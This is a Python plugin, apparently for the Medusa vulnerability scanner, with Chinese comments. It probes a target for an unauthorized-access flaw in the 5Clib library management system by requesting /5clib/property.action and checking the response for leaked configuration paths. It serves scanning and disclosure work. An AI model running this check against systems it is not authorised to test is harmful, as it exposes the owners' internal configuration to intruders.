#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/11 16:39 PM'
import requests
import ClassCongregation


class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-1-6"  # 插件编辑时间
        self.info['disclosure']='2015-10-26'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "FiveClibthereIsAnUnauthorizedLoophole"  # 插件名称
        self.info['name'] ='五车图书管理系统存在越权漏洞' #漏洞名称
        self.info['affects'] = "5Clib"  # 漏洞组件
        self.info['desc_content'] = "五车图书管理系统/5clib/property.action越权漏洞"  # 漏洞描述
        self.info['rank'] = "中危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = "/5clib/property.action"

        payload_url = url + payload

        resp = requests.get(payload_url, headers=Headers, timeout=6,proxies=proxies,  verify=False)
        con = resp.text
        code = resp.status_code
        if code== 200 and con.find('DEFAULT_PDF_LIB_PATH') != -1 and con.find('DEFAULT_SQL_BACKUP_PATH') != -1:
            Medusa = "{}存在五车图书管理系统存在越权漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类